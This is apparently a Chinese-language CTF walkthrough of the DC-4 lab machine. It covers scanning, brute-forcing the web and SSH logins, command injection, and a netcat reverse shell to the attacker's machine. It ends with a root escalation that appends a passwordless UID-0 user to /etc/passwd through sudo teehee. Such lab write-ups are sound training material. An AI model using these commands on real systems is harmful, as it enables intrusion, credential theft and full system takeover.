# DC-4靶机解题思路

目标机IP地址：192.168.16.142  
攻击机kali IP地址：192.168.16.138

  

arp-scan -l

![](../Images/63eb7f5e44de66c278965808bcfa0b08.png)

  

端口扫描

nmap -sV -p- 192.168.16.142     开放了80与22。

![](../Images/24a312bd44316edd73fd8f5cca055c9f.png)

  

访问80端口。  

![](../Images/7eea42accbb0b32146d7b8b5731b62bd.png)

  

根据提示页面提示可以使用admin用户登陆，尝试对它进行爆破，使用burp中的Intuder模块。

![](../Images/eb2017673ccc20487332135448e141b2.png)

  

爆破后发现密码为happy时，响应正文的长度较长，使用happy尝试登陆一下。

![](../Images/881635483afc9103f795f3e3fc41e392.png)

  

登陆成功用户名admin，密码happy。

![](../Images/4ac55a448ade7b2e816b6cf98d7336c9.png)

  

随意点一点，点击Command以后run一下发现可以执行命令。  

![](../Images/a6ceb983b04942c9111e636a3bd08967.png)

  

使用burp进行抓包，结合Repeater对数据包进行重放尝试执行其他命令。执行成功。

![](../Images/2ba975e7db4ecaeeb1706f9cf1edc9e6.png)

  

尝试反弹shell，首先攻击机监听7777端口，等待 .......

nc -e /bin/bash 192.168.16.138 7777

反弹成功。

![](../Images/44d6ecc0ad8aa76fb3cdbdddd5411170.png)

  

python -c 'import pty;pty.spawn("/bin/bash")'   转换交互式shell，对目录文件进行检查，查看用户 cat /etc/passwd。

![](../Images/25570159c453c0d31f5f3723d72b61ff.png)

![](../Images/17f0563bd291c1d1243c6a318f6af859.png)

  

进入这几个用户的家目录进行信息收集。jim用户发现了一个关于密码的文件，

/home/jim/backups/old-passwords.bak 将文件进行保存。无权查看mbox文件。查看test.sh未发现有用信息。

![](../Images/0b601e0debc13d4f539a6cb23249d1d4.png)

![](../Images/90657a525ea6612b55db579342ecf60f.png)

![](../Images/1c8efbf162499b9595d2cda74371e03b.png)

  

ssh爆破刚刚在jim用户里发现了一个关于密码的文件，使用hydra进行爆破  

hydra -l jim -P dc4pass.txt ssh://192.168.16.142 

爆出密码后进行登录 ssh  jim@192.168.16.142  

![](../Images/2fd52dfd37235f5faa84c0c9563943b7.png)

![](../Images/66cc6181d26a97f247fbc098dfbac1cd.png)

  

打开mbox 是来自root的一封邮件大致的内容是这是一个测试。

进入邮件服务目录查看邮件发现了一封由charles发给jim的密码邮件。

cat /var/mail/jim

![](../Images/97c125884dfe3b135bf5cdffa9627532.png)

  

切换用户charles/^xHhA&hvim0y。

sudo -l :列出目前用户可执行与无法执行的指令。

发现teehee命令无需root用户密码即可以root权限执行。 

查看teehee命令的作用。

![](../Images/78f5552dfef363f42bcc3755769d4b06.png)

  

teehee：输入输出文件。这里使用-a 选项 追加不覆盖。

![](../Images/6211f9f90396f9db5c47c53ec0ad11ca.png)

  

使用teehee \-a 创建一个用户拥有root权限的用户。

参照/etc/passwd 。  

root:x:0:0:root:/root:/bin/bash

echo dc41::0:0:::/bin/bash | sudo teehee -a /etc/passwd

![](../Images/4cac8142827ec3cc7d3b2348fa0bdc9c.png)

  

进入root用户家目录发现flag成功夺旗。

![](../Images/099c7874c3a0512c0c6406e29cf56c55.png)
